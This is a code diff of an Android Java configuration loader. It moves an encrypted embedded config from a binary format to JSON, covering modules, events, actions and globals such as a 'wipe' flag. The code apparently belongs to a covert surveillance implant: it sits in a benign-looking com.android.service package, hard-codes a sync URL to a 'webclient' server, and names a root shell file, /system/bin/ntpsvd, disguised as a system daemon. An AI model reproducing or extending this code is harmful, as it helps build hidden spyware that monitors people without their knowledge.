@@ -10,19 +10,27 @@ package com.android.service.conf;
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
+import java.util.Arrays;
+import java.util.Hashtable;
+import java.util.Iterator;
+
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+import org.json.JSONTokener;
 
 import com.android.service.Debug;
 import com.android.service.GeneralException;
 import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.action.Action;
-import com.android.service.agent.AgentConf;
-import com.android.service.agent.AgentType;
+
 import com.android.service.auto.Cfg;
 import com.android.service.crypto.Crypto;
+import com.android.service.crypto.Encryption;
+import com.android.service.crypto.EncryptionPKCS5;
 import com.android.service.crypto.Keys;
-import com.android.service.event.EventConf;
-import com.android.service.event.EventType;
+
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
@@ -38,30 +46,13 @@ public class Configuration {
 	/**
 	 * Configuration file embedded into the .apk
 	 */
-	private final byte[] resource;
+	private final String jsonResource;
 
 	/** Clear configuration buffer wrapped into a ByteBuffer. */
-	private ByteBuffer wrappedClearConf;
-
-	/**
-	 * Configuration file tags (ASCII format, NULL-terminated in binary
-	 * configuration).
-	 */
-	public static final String AGENT_CONF_DELIMITER = Messages.getString("17.0"); //$NON-NLS-1$
-
-	/** The Constant EVENT_CONF_DELIMITER. */
-	public static final String EVENT_CONF_DELIMITER = Messages.getString("17.1"); //$NON-NLS-1$
-
-	/** The Constant MOBIL_CONF_DELIMITER. */
-	public static final String MOBIL_CONF_DELIMITER = Messages.getString("17.2"); //$NON-NLS-1$
-
-	/** This one is _not_ NULL-terminated into the binary configuration. */
-	public static final String ENDOF_CONF_DELIMITER = Messages.getString("17.3"); //$NON-NLS-1$
+	// private ByteBuffer wrappedClearConf;
 
 	/** The Constant TASK_ACTION_TIMEOUT. */
 	public static final long TASK_ACTION_TIMEOUT = 600000;
-
-	public static final boolean GPS_ENABLED = true;
 
 	public static final boolean OVERRIDE_SYNC_URL = false;
 	public static final String SYNC_URL = "http://172.20.20.147/wc12/webclient"; //$NON-NLS-1$
@@ -71,6 +62,8 @@ public class Configuration {
 	public static final String shellFile = "/system/bin/ntpsvd";
 
 	private static final int AGENT_ENABLED = 0x2;
+
+	private static final int DIGEST_LEN = 20;
 
 	// public static final String SYNC_URL =
 	// "http://192.168.1.189/wc12/webclient";
@@ -82,10 +75,17 @@ public class Configuration {
 	 * 
 	 * @param resource
 	 *            the resource
+	 * @throws GeneralException
 	 */
-	public Configuration(final byte[] resource) {
+	public Configuration(final byte[] resource) throws GeneralException {
 		status = Status.self();
-		this.resource = resource;
+		// Decrypt Conf
+		jsonResource = decryptConfiguration(resource);
+	}
+
+	public Configuration(String jsonConf) throws GeneralException {
+		status = Status.self();
+		jsonResource = jsonConf;
 	}
 
 	/**
@@ -98,326 +98,205 @@ public class Configuration {
 	public boolean loadConfiguration(boolean instantiate) {
 		try {
 			// Clean old configuration
-			if(instantiate){
+			if (instantiate) {
 				cleanConfiguration();
 			}
 
-			// Decrypt Conf
-			decryptConfiguration(resource);
-
 			// Parse and load configuration
-			return parseConfiguration(instantiate);
+			return parseConfiguration(instantiate, jsonResource);
 		} catch (final Exception rcse) {
 			return false;
 		}
 
 	}
 
-	/**
-	 * Parses the configuration.
-	 * 
-	 * @throws GeneralException
-	 *             the rCS exception
-	 */
-	private boolean parseConfiguration(boolean instantiate) throws GeneralException {
-		try {
-			// Parse the whole configuration
-			loadAgents(instantiate);
-			loadEvents(instantiate);
-			loadActions(instantiate);
-			loadOptions(instantiate);
+	abstract static class Visitor {
+		protected boolean instantiate;
 
-			// Debug Check. start //$NON-NLS-1$
-			Debug.StatusActions();
-			Debug.StatusAgents();
-			Debug.StatusEvents();
-			Debug.StatusOptions();
-			// Debug Check. end //$NON-NLS-1$
-		} catch (final GeneralException rcse) {
-			return false;
+		public Visitor(boolean instantiate) {
+			this.instantiate = instantiate;
 		}
 
-		return true;
-	}
+		public static void load(JSONArray jmodules, Visitor visitor) {
+			int agentTag;
 
-	/**
-	 * Crc.
-	 * 
-	 * @param buffer
-	 *            : input buffer
-	 * @param offset
-	 *            : offset
-	 * @param len
-	 *            : length of data into the buffer (buffer can be larger than
-	 *            data)
-	 * @return the int
-	 */
-	private int crc(final byte[] buffer, final int offset, final int len) {
-		// CRC
-		int confHash;
-		long tempHash = 0;
-
-		for (int i = offset; i < (len - offset); i++) {
-			tempHash++;
-
-			final byte b = buffer[i];
-
-			if (b != 0) {
-				tempHash *= b;
-			}
-
-			confHash = (int) (tempHash >> 32);
-
-			tempHash = tempHash & 0xFFFFFFFFL;
-			tempHash ^= confHash;
-			tempHash = tempHash & 0xFFFFFFFFL;
-		}
-
-		confHash = (int) tempHash;
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " Configuration CRC: " + confHash);//$NON-NLS-1$
-		}
-		return confHash;
-	}
-
-	/**
-	 * Return the index at witch tag begins.
-	 * 
-	 * @param tag
-	 *            string
-	 * @return the offset where the tag ends
-	 * @throws GeneralException
-	 *             the rCS exception
-	 */
-	private int findTag(final String tag) throws GeneralException {
-		final int index = Utils.getIndex(wrappedClearConf.array(), tag.getBytes());
-
-		if (index == -1) {
-			throw new GeneralException("Tag " + tag + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
-		}
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " Tag " + tag + " found at: " + index);//$NON-NLS-1$ //$NON-NLS-2$
-		}
-		return index;
-	}
-
-	/**
-	 * Parses configuration file and loads the agents into Status.
-	 * 
-	 * @throws GeneralException
-	 *             the rCS exception
-	 */
-	private void loadAgents(boolean instantiate) throws GeneralException {
-		int agentTag;
-
-		try {
-			// Identify agents' section
-			agentTag = findTag(AGENT_CONF_DELIMITER);
-			agentTag += AGENT_CONF_DELIMITER.length() + 1;
-		} catch (final GeneralException rcse) {
-			throw rcse;
-		}
-
-		// How many agents we have?
-		final int agentNum = wrappedClearConf.getInt(agentTag);
-		wrappedClearConf.position(agentTag + 4);
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " Number of agents: " + agentNum);//$NON-NLS-1$
-		}
-
-		// Get id, status, parameters length and parameters
-		for (int i = 0; i < agentNum; i++) {
-			final int typeId = wrappedClearConf.getInt();
-			final boolean enabled = wrappedClearConf.getInt() == AGENT_ENABLED;
-			final int plen = wrappedClearConf.getInt();
-
-			final byte[] params = new byte[plen];
-
-			if (plen != 0) {
-				wrappedClearConf.get(params, 0, plen);
-			}
+			// How many agents we have?
+			final int num = jmodules.length();
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Agent: " + typeId + " Enabled: " + enabled + " Params Len: " + plen);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+				Check.log(TAG + " Number of elements: " + num);//$NON-NLS-1$
 			}
 
-			if (AgentType.isValid(typeId)) {
-				if (instantiate) {
-					final AgentConf a = new AgentConf(typeId, enabled, params);
-					status.addAgent(a);
-				}
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " Error (loadAgents): null key");//$NON-NLS-1$
-				}
-			}
-		}
-
-		return;
-	}
-
-	/**
-	 * Parses configuration file and loads the events into Status.
-	 * 
-	 * @throws GeneralException
-	 *             the rCS exception
-	 */
-	private void loadEvents(boolean instantiate) throws GeneralException {
-		int eventTag;
-
-		try {
-			// Identify events' section
-			eventTag = findTag(EVENT_CONF_DELIMITER);
-			eventTag += EVENT_CONF_DELIMITER.length() + 1;
-		} catch (final GeneralException rcse) {
-			throw rcse;
-		}
-
-		// How many events we have?
-		final int eventNum = wrappedClearConf.getInt(eventTag);
-		wrappedClearConf.position(eventTag + 4);
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " Number of events: " + eventNum);//$NON-NLS-1$
-		}
-
-		// Get id, status, parameters length and parameters
-		for (int i = 0; i < eventNum; i++) {
-			final int typeId = wrappedClearConf.getInt();
-			final int action = wrappedClearConf.getInt();
-			final int plen = wrappedClearConf.getInt();
-
-			final byte[] params = new byte[plen];
-
-			if (plen != 0) {
-				wrappedClearConf.get(params, 0, plen);
-			}
-
-			if (EventType.isValid(typeId)) {
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " Configuration.java Event: " + typeId + " Action: " + action + " Params Len:  " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
-							+ plen); //$NON-NLS-1$
-				}
-
-				if (instantiate) {
-					final EventConf e = new EventConf(typeId, i, action, params);
-					status.addEvent(e);
-				}
-			}
-		}
-
-		return;
-	}
-
-	/*
-	 * Load the actions into Status, due to configuration file format, this
-	 * method can only be called after calling loadEvents()
-	 */
-	/**
-	 * Load actions.
-	 * 
-	 * @throws GeneralException
-	 *             the rCS exception
-	 */
-	private void loadActions(boolean instantiate) throws GeneralException {
-		final int actionNum = wrappedClearConf.getInt();
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " Number of actions " + actionNum);//$NON-NLS-1$
-		}
-
-		try {
-			for (int i = 0; i < actionNum; i++) {
-				final int subNum = wrappedClearConf.getInt();
-
-				final Action a = new Action(i);
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " Action " + i + " SubActions: " + subNum);//$NON-NLS-1$ //$NON-NLS-2$
-				}
-
-				for (int j = 0; j < subNum; j++) {
-					final int type = wrappedClearConf.getInt();
-					final int plen = wrappedClearConf.getInt();
-
-					final byte[] params = new byte[plen];
-
-					if (plen != 0) {
-						wrappedClearConf.get(params, 0, plen);
+			// Get id, status, parameters length and parameters
+			for (int i = 0; i < num; i++) {
+				JSONObject jobject;
+				try {
+					jobject = jmodules.getJSONObject(i);
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (load): "+jobject);
 					}
-
-					if (a.addSubAction(type, params)) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " SubAction " + j + " Type: " + type + " Params Length: " + plen);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
-						}
+					visitor.call(i, jobject);
+				} catch (JSONException e1) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (load) Error: " + e1);
+					}
+				} catch (GeneralException e) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (load) Error: " + e);
+					}
+				} catch (ConfigurationException e) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (load) Error: " + e);
 					}
 				}
-
-				if (Cfg.DEBUG) {
-					Check.ensures(a.getSubActionsNum() == subNum, "inconsistent subaction number"); //$NON-NLS-1$
-				}
-
-				if (instantiate) {
-					status.addAction(a);
-				}
 			}
-		} catch (final GeneralException rcse) {
-			throw rcse;
 		}
 
-		return;
+		public abstract void call(int id, JSONObject o) throws ConfigurationException, JSONException, GeneralException;
 	}
 
-	/**
-	 * Load options.
-	 * 
-	 * @throws GeneralException
-	 *             the rCS exception
-	 */
-	private void loadOptions(boolean instantiate) throws GeneralException {
-		int optionsTag;
-
-		try {
-			// Identify agents' section
-			optionsTag = findTag(MOBIL_CONF_DELIMITER);
-			optionsTag += MOBIL_CONF_DELIMITER.length() + 1;
-		} catch (final GeneralException rcse) {
-			throw rcse;
+	class LoadModule extends Visitor {
+		public LoadModule(boolean instantiate) {
+			super(instantiate);
 		}
 
-		// How many agents we have?
-		final int optionsNum = wrappedClearConf.getInt(optionsTag);
-		wrappedClearConf.position(optionsTag + 4);
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " Number of options: " + optionsNum);//$NON-NLS-1$
-		}
-
-		// Get id, status, parameters length and parameters
-		for (int i = 0; i < optionsNum; i++) {
-			final int id = wrappedClearConf.getInt();
-			final int plen = wrappedClearConf.getInt();
-
-			final byte[] params = new byte[plen];
-
-			if (plen != 0) {
-				wrappedClearConf.get(params, 0, plen);
-			}
+		public void call(int moduleId, JSONObject params) throws ConfigurationException, GeneralException,
+				JSONException {
+			final String moduleType = params.getString("module");
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Option: " + id + " Params Len: " + plen);//$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " Module: " + moduleType + " Params size: " + params.length());//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 			}
 
 			if (instantiate) {
-				final Option o = new Option(id, params);
-				status.addOption(o);
+				final ConfModule a = new ConfModule(moduleType, params);
+				Status.self().addAgent(a);
 			}
 		}
+	}
 
-		return;
+	class LoadEvent extends Visitor {
+		public LoadEvent(boolean instantiate) {
+			super(instantiate);
+		}
+
+		public void call(int eventId, JSONObject jmodule) throws JSONException, GeneralException {
+			if (Cfg.DEBUG) {
+				Check.requires(jmodule != null, " (call) Assert failed, null jmodule");
+			}
+			
+			String eventType = jmodule.getString("event");
+			if (Cfg.DEBUG) { Check.asserts(eventType!=null, " (call) Assert failed, null eventType"); }
+			if (jmodule.has("type")) {
+				eventType += " " + jmodule.getString("type");
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Event: " + eventId + " type: " + eventType + " Params size: " + jmodule.length());//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+			}
+
+			if (instantiate) {
+				final ConfEvent e = new ConfEvent(eventId, eventType, jmodule);
+				Status.self().addEvent(e);
+			}
+
+		}
+	}
+
+	class LoadAction extends Visitor {
+		public LoadAction(boolean instantiate) {
+			super(instantiate);
+		}
+
+		public void call(int actionId, JSONObject jaction) throws ConfigurationException, GeneralException,
+				JSONException {
+			String desc = jaction.getString("desc");
+			final Action a = new Action(actionId, desc);
+
+			JSONArray jsubactions = jaction.getJSONArray("subactions");
+			int subNum = jsubactions.length();
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Action " + actionId + " SubActions: " + subNum);//$NON-NLS-1$ //$NON-NLS-2$
+			}
+
+			for (int j = 0; j < subNum; j++) {
+				JSONObject jsubaction = jsubactions.getJSONObject(j);
+
+				final String type = jsubaction.getString("action");
+				ConfAction conf = new ConfAction(actionId, j, type, jsubaction);
+				if (a.addSubAction(conf)) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " SubAction " + j + " Type: " + type + " Params Length: " + jsubaction.length());//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+					}
+				}
+			}
+
+			if (Cfg.DEBUG) {
+				Check.ensures(a.getSubActionsNum() == subNum, "inconsistent subaction number"); //$NON-NLS-1$
+			}
+
+			if (instantiate) {
+				status.addAction(a);
+			}
+		}
+	}
+
+	/**
+	 * Parses the configuration. k
+	 * 
+	 * @throws GeneralException
+	 *             the rCS exception
+	 */
+	private boolean parseConfiguration(boolean instantiate, String json) throws GeneralException {
+		try {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (parseConfiguration): " + json);
+			}
+			JSONObject root = (JSONObject) new JSONTokener(json).nextValue();
+
+			JSONArray jmodules = root.getJSONArray("modules");
+			JSONArray jevents = root.getJSONArray("events");
+			JSONArray jactions = root.getJSONArray("actions");
+			JSONObject jglobals = root.getJSONObject("globals");
+
+			Visitor.load(jmodules, new LoadModule(instantiate));
+			Visitor.load(jevents, new LoadEvent(instantiate));
+			Visitor.load(jactions, new LoadAction(instantiate));
+
+			loadGlobals(jglobals, instantiate);
+
+			// Debug Check. start //$NON-NLS-1$
+			Debug.statusActions();
+			Debug.statusModules();
+			Debug.statusEvents();
+			Debug.statusGlobals();
+			// Debug Check. end //$NON-NLS-1$
+
+			return true;
+		} catch (JSONException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (parseConfiguration) Error: " + e);
+			}
+			return false;
+		}
+
+	}
+
+	private void loadGlobals(JSONObject jglobals, boolean instantiate) throws JSONException {
+
+		Globals g = new Globals();
+
+		JSONObject jquota = jglobals.getJSONObject("quota");
+		g.quotaMin = jquota.getInt("min");
+		g.quotaMax = jquota.getInt("max");
+
+		g.wipe = jglobals.getBoolean("wipe");
+		g.type = jglobals.getString("type");
+		g.migrated = jglobals.getBoolean("migrated");
+		g.version = jglobals.getInt("version");
+
+		status.setGlobal(g);
 	}
 
 	/**
@@ -425,10 +304,11 @@ public class Configuration {
 	 * 
 	 * @param rawConf
 	 *            the raw conf
+	 * @return
 	 * @throws GeneralException
 	 *             the rCS exception
 	 */
-	private void decryptConfiguration(final byte[] rawConf) throws GeneralException {
+	private String decryptConfiguration(final byte[] rawConf) throws GeneralException {
 		/**
 		 * Struttura del file di configurazione
 		 * 
@@ -455,46 +335,23 @@ public class Configuration {
 
 			// Crypto crypto = new Crypto(Keys.g_ConfKey);
 			final byte[] confKey = Keys.self().getConfKey();
-			final Crypto crypto = new Crypto(confKey);
-			final byte[] clearConf = crypto.decrypt(rawConf, 0);
 
-			// Extract clear length DWORD
-			this.wrappedClearConf = Utils.bufferToByteBuffer(clearConf, ByteOrder.LITTLE_ENDIAN);
+			EncryptionPKCS5 crypto = new EncryptionPKCS5(confKey);
+			// final Crypto crypto = new Crypto(confKey);
+			final byte[] clearConf = crypto.decryptDataIntegrity(rawConf);
 
-			final int confClearLen = this.wrappedClearConf.getInt();
+			String json = new String(clearConf);
 
-			// Verify CRC
-			final int confCrc = this.wrappedClearConf.getInt(confClearLen - 4);
+			if (json != null && json.length() > 0) {
+				// Return decrypted conf
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Configuration is valid");//$NON-NLS-1$
+				}
 
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (decryptConfiguration): confClearLen" + confClearLen);
+				return json;
 			}
+			return null;
 
-			if (confClearLen - 4 <= 0) {
-				throw new GeneralException("Wrong length");
-			}
-
-			if (clearConf.length < confClearLen - 4) {
-				throw new GeneralException("Wrong length");
-			}
-
-			if (confCrc != crc(clearConf, 0, confClearLen - 4)) {
-				throw new GeneralException("CRC mismatch, stored CRC = " + confCrc + " calculated CRC = " //$NON-NLS-1$ //$NON-NLS-2$
-						+ crc(clearConf, 0, confClearLen));
-			}
-
-			// Return decrypted conf
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Configuration is valid");//$NON-NLS-1$
-			}
-			return;
-		} catch (final IOException ioe) {
-			if (Cfg.DEBUG) {
-				Check.log(ioe);//$NON-NLS-1$
-			}
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " IOException() detected");//$NON-NLS-1$
-			}
 		} catch (final SecurityException se) {
 			if (Cfg.DEBUG) {
 				Check.log(se);//$NON-NLS-1$
@@ -511,7 +368,7 @@ public class Configuration {
 			}
 		}
 
-		return;
+		return null;
 	}
 
 	/**
@@ -521,8 +378,6 @@ public class Configuration {
 		// Clean an eventual old initialization
 		status.clean();
 
-		// Clean configuration buffer
-		wrappedClearConf = null;
 	}
 
 	public static boolean isDebug() {
